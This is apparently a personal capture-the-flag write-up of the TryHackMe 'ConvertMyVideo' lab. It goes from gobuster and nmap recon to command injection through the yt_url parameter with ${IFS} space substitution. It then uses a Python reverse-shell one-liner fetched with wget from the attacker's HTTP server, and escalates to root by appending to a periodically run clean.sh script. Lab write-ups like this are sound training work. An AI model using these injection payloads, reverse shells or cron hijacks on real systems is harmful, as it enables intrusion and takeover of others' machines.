---
created: 2026-11-25
tags:
  - note
  - journal
  - thm
  - cyber
  - cyberStuff
title: ConvertMyVideo
date: 2026-11-25T09:33:00.779Z
lastmod: 2026-11-26T13:52:53.061Z
---
link : https://tryhackme.com/room/convertmyvideo\
recon

```bash
┌──(k㉿kali)-[~]
└─ gobuster dir -u 'http://10.112.158.22/' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.158.22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 315] [--> http://10.112.158.22/images/]
admin                (Status: 401) [Size: 460]
js                   (Status: 301) [Size: 311] [--> http://10.112.158.22/js/]
tmp                  (Status: 301) [Size: 312] [--> http://10.112.158.22/tmp/]
Progress: 43990 / 220558 (19.94%)[ERROR] error on word aer: timeout occurred during the request
server-status        (Status: 403) [Size: 278]
Progress: 189094 / 220557 (85.73%)^C
```

ports opened :

```bash
┌──(k㉿kali)-[~]
└─ nmap 10.113.175.75
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-26 13:02 +0200
Nmap scan report for 10.113.175.75
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds

```

accessing the webpage we found this :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126130328.png)\
the response for any kind of input takes very long, lets try a command injection.\
open burpsuite , access the website , input something and intercept the request

![](/images/blog-ul-meu/static/Pasted%20image%2020261126131716.png)\
the request\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126131958.png)\
press CTRL +R to send the request to the repeater\
inspecting the request we can see that the site appends our command to a youtube searching query , lets try some to temper with it\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126132419.png)\
i tried different payloads for a command injection using the intruder and this wordlist of different payloads https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/OS-Command-Injection-Unix-Payloads.txt\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126134915.png)\
i found 2 working payloads formats , `|command;` and `--|coomand;`,kinda the same thing\
knowing the format now we have rce on the machine\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126135150.png)\
cool , rn we could try to enumerate and find the flags this way but it would take forever and it would be very ugly, so, lets try to get a reverse shell.\
first of all get a reverse shell from pentest monkey, we know that the machine in running python because of the error message

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

take this command and put it in a script.py then start a server on your machine with

```bash
python -m http.server 8000
```

after that execute the follwing command:

```bash
wget${IFS}http://192.168.130.57:8000/script.py 
```

${IFS} is used because the request doesn't understand well whitespaces , so we have to use ${IFS} which stands for **Internal Field Separator** which is a terminal variable\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126143815.png)\
as we can see the file is copied\
the run

```
yt_url=|python${IFS}script.py;
```

and boom reverse shell\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126144020.png)\
now we can enumerate the machine and machine and get the flags\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126144126.png)\
this is for the username\
![](/images/blog-ul-meu/static/Pasted%20image%2020261126144431.png)\
as for the last flag, we found a clean.sh file which run periodically on the machine in the folder\
`/var/www/html/tmp` .\
we have to go in the specified folder and and run

```bash
echo 'cat /root/root.txt > rootflag.txt' >> clean.sh
```

after e few moments a rootflag.txt file will spawn , cat it and get the last flag
